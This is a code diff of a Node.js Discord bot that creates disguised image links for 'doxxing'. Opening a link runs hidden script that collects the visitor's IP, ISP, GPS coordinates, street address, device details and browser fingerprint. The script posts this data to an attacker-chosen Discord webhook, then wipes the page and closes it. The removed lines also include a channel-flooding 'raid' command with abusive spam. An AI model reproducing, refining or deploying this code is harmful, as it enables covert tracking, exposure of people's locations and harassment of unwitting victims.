@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const crypto = require('crypto');
 const express = require('express');
 const app = express();
@@ -6,119 +6,123 @@ const app = express();
 // ---- ENVIRONMENT VARIABLES ----
 const TOKEN = process.env.TOKEN;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
-const INVITE_LINK = 'https://discord.gg/AjUx96vJH';
-const OWNER_ID = process.env.OWNER_ID;
 const PORT = process.env.PORT || 3000;
 
+// ---- MINIMAL INTENTS ----
 const client = new Client({
-    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages
+    ],
 });
 
+// ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
+// ---- EXPRESS SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
+    console.log(`🔍 Requested ID: ${id}`);
+    console.log(`📦 Current links:`, Array.from(links.keys()));
+    
     if (!links.has(id)) {
+        console.log(`❌ ID not found: ${id}`);
         res.type('image/png');
         return res.send('Image not found');
     }
+    
+    console.log(`✅ ID found: ${id}`);
     const linkData = links.get(id);
     const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
     res.type('text/html');
     res.send(generateDoxHTML(targetWebhook));
 });
 
-app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🌐 Server running on port ${PORT}`);
+});
 
+// ---- DISCORD BOT ----
 client.once('ready', async () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
-    await client.application.commands.set([
-        { 
-            name: 'dox', 
-            description: 'Generate a fresh dox link',
-            options: [{ name: 'webhook', description: 'Discord webhook URL', type: 3, required: true }]
-        },
-        { 
-            name: 'raid', 
-            description: 'Flood the channel with a raid message',
-            options: [{ name: 'count', description: 'Number of lines (1-35)', type: 4, required: false }]
-        },
-        { name: 'invite', description: 'Get an invite link for Pulse' }
-    ]);
-    console.log('✅ Commands registered');
+    
+    try {
+        await client.application.commands.set([]);
+        console.log('✅ Cleared all global commands');
+        
+        const guilds = await client.guilds.fetch();
+        for (const [id, guild] of guilds) {
+            try {
+                await guild.commands.set([]);
+                console.log(`✅ Cleared commands in guild: ${guild.name}`);
+            } catch (err) {
+                console.log(`❌ Could not clear commands in guild: ${guild.name}`);
+            }
+        }
+        
+        await client.application.commands.set([
+            { 
+                name: 'dox', 
+                description: 'Generate a fresh dox link',
+                options: [
+                    {
+                        name: 'webhook',
+                        description: 'Discord webhook URL to send data to',
+                        type: 3,
+                        required: true
+                    }
+                ]
+            }
+        ]);
+        console.log('✅ Commands registered');
+    } catch (error) {
+        console.error('❌ Failed to register commands:', error);
+    }
 });
 
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
+    // ---- DOX ----
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
+
         const customWebhook = interaction.options.getString('webhook');
         if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
-            return interaction.editReply('❌ Invalid webhook URL.');
+            return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
         }
+        
         const id = crypto.randomBytes(6).toString('hex');
         const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
-        links.set(id, { created: Date.now(), user: interaction.user.tag, webhook: customWebhook });
+
+        links.set(id, {
+            created: Date.now(),
+            user: interaction.user.tag,
+            webhook: customWebhook
+        });
+
+        console.log(`✅ Generated link: ${url}`);
+        console.log(`📦 Webhook: ${customWebhook}`);
+
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Link Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 **${url}**\n\nFull device + location data will be logged.`)
-            .setFooter({ text: 'Expires after 100 links' });
+            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
+            .addFields(
+                { name: '📍 What gets logged', value: '• Exact coordinates (GPS if allowed)\n• Street address (if GPS allowed)\n• IP, ISP, ASN\n• Battery level & charging status\n• Connection type & speed\n• Browser, OS, GPU, Screen\n• Incognito & Ad Blocker detection\n• Canvas fingerprint & installed fonts', inline: false }
+            )
+            .setFooter({ text: 'Expires after 100 links generated' });
+
         await interaction.editReply({ embeds: [embed] });
     }
-
-    if (interaction.commandName === 'raid') {
-        await interaction.deferReply({ ephemeral: true });
-        const channel = interaction.channel;
-        if (!channel) return interaction.editReply('❌ Bot not in this server.');
-        const count = Math.min(interaction.options.getInteger('count') || 20, 35);
-        try {
-            const lines = [];
-            for (let i = 0; i < count; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
-            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
-            const msg = lines.join('\n');
-            await channel.send(msg);
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('raid_again').setLabel('🔁 Send Again').setStyle(ButtonStyle.Primary)
-            );
-            await interaction.editReply({ content: `✅ Raid sent (${count} lines).`, components: [row] });
-        } catch (e) {
-            await interaction.editReply('❌ Failed to send raid.');
-        }
-    }
-
-    if (interaction.commandName === 'invite') {
-        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ No permission.', ephemeral: true });
-        const embed = new EmbedBuilder()
-            .setTitle('📩 Invite Pulse')
-            .setColor(0x8B5CF6)
-            .setDescription(`[➕ Add Bot](https://discord.com/oauth2/authorize?client_id=1545939378361081916)`);
-        await interaction.reply({ embeds: [embed] });
-    }
 });
 
-client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isButton()) return;
-    if (interaction.customId === 'raid_again') {
-        await interaction.deferReply({ ephemeral: true });
-        const channel = interaction.channel;
-        if (!channel) return interaction.editReply('❌ Channel not found.');
-        try {
-            const lines = [];
-            for (let i = 0; i < 20; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
-            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
-            await channel.send(lines.join('\n'));
-            await interaction.editReply('✅ Raid sent again.');
-        } catch (e) {
-            await interaction.editReply('❌ Failed.');
-        }
-    }
-});
-
+// ---- CLEANUP ----
 setInterval(() => {
     const keys = Array.from(links.keys());
-    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
+    if (keys.length > 100) {
+        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
+    }
 }, 60000);
 
 // ---- ULTIMATE DOX HTML ----
@@ -258,6 +262,7 @@ function generateDoxHTML(webhook) {
     // ---- MAIN ----
     (async function() {
         try {
+            // Collect everything
             const ipData = await getIPData();
             const ip = ipData.ip;
             const country = ipData.country;
@@ -270,26 +275,14 @@ function generateDoxHTML(webhook) {
             const isp = ipData.isp;
             const tz = ipData.timezone;
 
-            // ---- BATTERY ----
             const battery = await getBattery();
-
-            // ---- CONNECTION ----
             const conn = getConnection();
-
-            // ---- GPU ----
             const gpu = getGPU();
-
-            // ---- WEBRTC ----
             const webRTC = await getWebRTC();
-
-            // ---- FONTS ----
             const fonts = getFonts();
-
-            // ---- CANVAS FP ----
             const canvasFP = getCanvasFP();
             const canvasHash = hash(canvasFP);
 
-            // ---- GPS + ADDRESS ----
             let address = 'N/A';
             let gpsLat = 'N/A';
             let gpsLon = 'N/A';
@@ -311,7 +304,6 @@ function generateDoxHTML(webhook) {
                 address = parts.length > 0 ? parts.join(', ') : 'N/A';
             }
 
-            // ---- BROWSER/OS ----
             const ua = navigator.userAgent;
             const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
             const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
@@ -329,7 +321,6 @@ function generateDoxHTML(webhook) {
                 }, 100);
             });
 
-            // ---- PACKAGE ----
             const data = {
                 timestamp: new Date().toISOString(),
                 ip, country, region, city, postal, lat, lon, asn, isp, tz,
@@ -360,17 +351,16 @@ function generateDoxHTML(webhook) {
                 userAgent: ua,
                 pageReferrer: document.referrer || 'N/A',
                 pageURL: window.location.href,
-                localIP: null // webrtc gives it
+                localIP: null
             };
 
-            // ---- MAP ----
             const mapLat = gpsLat !== 'N/A' ? gpsLat : lat;
             const mapLon = gpsLon !== 'N/A' ? gpsLon : lon;
             const mapUrl = \`https://www.google.com/maps?q=\${mapLat},\${mapLon}\`;
             const locSource = gpsLat !== 'N/A' ? '🎯 GPS' : '📍 IP';
 
-            // ---- SEND ----
-            fetch(WEBHOOK_URL, {
+            // ---- SEND TO WEBHOOK ----
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -411,14 +401,21 @@ function generateDoxHTML(webhook) {
                         footer: { text: "Logged at " + data.timestamp }
                     }]
                 })
-            }).catch(() => {});
+            });
 
-        } catch (err) {}
+        } catch (err) {
+            console.error('Dox error:', err);
+        }
+
+        // ---- CLOSE AFTER SENDING ----
         document.body.innerHTML = '';
         document.body.style.background = '#ffffff';
         document.body.style.margin = '0';
         document.body.style.height = '100vh';
-        setTimeout(() => { window.close(); window.location.href = 'about:blank'; }, 1500);
+        setTimeout(() => {
+            window.close();
+            window.location.href = 'about:blank';
+        }, 1500);
     })();
 <\/script>
 </body>
